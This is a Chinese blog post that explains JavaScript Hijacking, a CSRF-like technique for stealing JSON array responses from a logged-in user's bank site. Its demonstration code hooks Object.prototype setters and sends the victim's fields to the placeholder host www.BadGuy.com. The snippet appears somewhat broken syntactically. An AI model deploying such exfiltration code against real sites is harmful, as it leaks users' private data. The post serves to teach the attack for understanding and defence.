---
layout:     post   				    # 使用的布局（不需要改）
title:      JavaScript Hijacking 				# 标题 
subtitle:   JS 劫持原理   #副标题
date:       2019-07-21 				# 时间
author:     Joel 						# 作者
header-img: img/post-bg-2015.jpg 	#这篇文章标题背景图片
catalog: true 						# 是否归档
tags:	javaScript							#标签
---


## JavaScript劫持  


## [深入理解JavaScript Hijacking原理](https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.html)



        最近在整理关于JavaScript代码安全方面的资料，在查关于JavaScript Hijacking的资料时，发现关于它的中文资料很少，故特意整理一下。

一.JavaScript Hijacking原理

        其实JavaScript Hijacking和CSRF攻击的思想很类似，关于CSRF攻击可以参考我之前写的《[浅谈CSRF攻击方式](https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)》，关于JavaScript Hijacking的攻击模型，见下图：

![](/img/blog/20190721JSHijacking_files/2009070218500674.jpg)

（1）.你正常访问信任站点（[http://www.Bank.com](http://www.bank.com/)），然后登陆信任站点。

（2）.信任站点通过你的验证，并返回Cookie。

（3）.这时，在你还没有登出信任站点之前，你再打开了一个浏览器的tab页，并访问了一个恶意站点（[www.BadGuy.com](http://www.badguy.com/)）。

（4）.恶意站点向请求用户访问[http://www.Bank.com](http://www.bank.com/)的一个资源。

（5）.浏览器带着之前的Cookie信息，向信任站点[http://www.Bank.com](http://www.bank.com/)发出了一个GET请求。

（6）.信任站点验证的Cookie信息通过，根据请求返回一个JSON数组（如果不清楚JSON，可以参考《[JSON入门指南](https://www.cnblogs.com/hyddd/archive/2009/06/15/1503914.html)》）。

（7）.你的浏览器收到来自[http://www.Bank.com](http://www.bank.com/)的响应后，转发响应中的JSON信息给恶意站点。

至此，恶意站点拿到你关于[http://www.Bank.com](http://www.bank.com/)的信息。

        到这里，你应该有对JavaScript Hijacking有一个大概的概念，它确实和CSRF很相像，唯一不同的是，<b>CSRF是模拟你的身份去发送请求，JavaScript Hijacking是模拟你的身份，窃取你在服务器上的私隐信息</b>。

<b>二.JavaScript Hijacking攻击示范代码：</b>

演示代码之前，首先明确几点：

（1）.恶意站点的攻击目标是明确的（这里目标就是[http://www.Bank.com](http://www.bank.com/)）。

（2）.恶意站点是通过用户给它返回信任网站的JSON数组（为什么是JSON数组？普通的JSON对象不行么？这个下面会提到！），从而获取用户私隐信息的。也就是说所谓的隐私数据，也就是这些JSON数组里面的数据，所以信任站点返回的不是JSON数组的数据或者JSON里面的信息是垃圾信息，那么这个恶意站点是徒劳的。

（3）.恶意站点必须实先知道用户返回的JSON的结构。

（4）.恶意站点能且只能发送GET请求......

（5）.这种攻击是需要浏览器支持的，至于为什么看下面吧。

恩，下面看一下攻击代码吧:>

这个恶意站点[www.BadGuy.com](http://www.badguy.com/)针对[www.Bank.com](http://www.bank.com/)的攻击代码：
<pre>&lt;script type=<span>&quot;text/javascript&quot;</span>&gt;<br>Object.prototype.__defineSetter__(<span>&apos;money&apos;</span>, <span>function</span>(obj) { var objString = &quot;&quot;;  for (fld in this) {objString += fld + &quot;: &quot; + this[fld] + &quot;, &quot;; }  req.open(&quot;GET&quot;, &quot;<a>http://www.BadGuy.com?obj=</a>&quot; +escape(objString),true); } req.send(null); );<br>&lt;/script&gt;<br>&lt;script type=<span>&quot;text/javascript&quot;</span> src=<span>&quot;http://www.Bank.com/UserInfo&quot;</span>&gt;&lt;/script&gt;</pre>

在用户访问恶意网站时：
<pre>&lt;script type=<span>&quot;text/javascript&quot;</span> src=<span>&quot;http://www.Bank.com/UserInfo&quot;</span>&gt;&lt;/script&gt;</pre>

（1）.这段JS代码会要求浏览器发送一个GET请求到[http://www.Bank.com/UserInfo](http://www.bank.com/UserInfo)，于是浏览器按照指示，带上本地的Cookie信息，发送一个http的GET请求。

（2）. [www.Bank.Com](http://www.bank.com/)接受到请求后，确认身份后，响应请求返回了一个JSON数组/JavaScript代码段。

（3）.客户端接受到这段JS脚本后，如果返回的是一个JSON数组，比如：

```
[{"Id":3,"Name":hyddd,"Money":10000}]
```

JSON数组被认为是一段可执行的JavaScript脚本，于是浏览器会解析执行。

如果返回的是一个JSON对象呢？

```
{"Id":3,"Name":hyddd,"Money":10000}
```

呵呵，这个是不会被浏览器执行的，因为浏览器认为：它不是一个JavaScript脚本。

如果它返回的是一个JavaScript脚本的话，恩，这得具体问题具体分析了，不一定能拿到什么数据。

（4）.看下面这段JavaScript脚本：
<pre>&lt;script type=<span>&quot;text/javascript&quot;</span>&gt;<br>Object.prototype.__defineSetter__(<span>&apos;Money&apos;</span>, <span>function</span>(obj) { <span>var</span> objString = <span>&quot;&quot;</span>;  <span>for</span> (fld <span>in</span> <span>this</span>) {objString += fld + <span>&quot;: &quot;</span> + <span>this</span>[fld] + <span>&quot;, &quot;</span>; }  req.open(<span>&quot;GET&quot;</span>, &quot;<a>http:<span>//www.BadGuy.com?obj</span></a>&quot;= +escape(objString),true); } req.send(null); );<br>&lt;/script&gt;<br></pre>

它的作用就是发送受害者的私隐信息到恶意站点的。

这里可能有人不理解，我大概说一下：

        Object.prototype.__defineSetter__，可以看做是JavaScript中的Hook（有人把这个称为[JavaScript函数劫持](http://www.yuanma.org/data/2007/1214/article_2924.htm)，注意JavaScript的函数劫持和JavaScript Hijacking不是同一个概念，JavaScript Hijacking的核心思想和CSRF攻击的核心思想应该是一致的），这里是对Object的Money属性设置了一个Hook，在JavaScript中，由于其他的对象都是派生自Object的，所以这段代码就对所有对象的Money属性都做了一个Hook，当有对象设置它的Money属性时，都会触发上面这段代码的运行。注意的是：__defineSetter__这个在IE系列的浏览器好像是不受支持的（在IE6下试了不行），但FireFox系列的浏览器是肯定支持的。

         后面的var objString=""...这就是发送受害者信息到恶意站点了，这里不说了。

         当浏览器解析（3）中的JSON数组时，会新建一个对象并赋值，这时候就出发了上面这段代码，结果私隐信息就发送到恶意站点了。

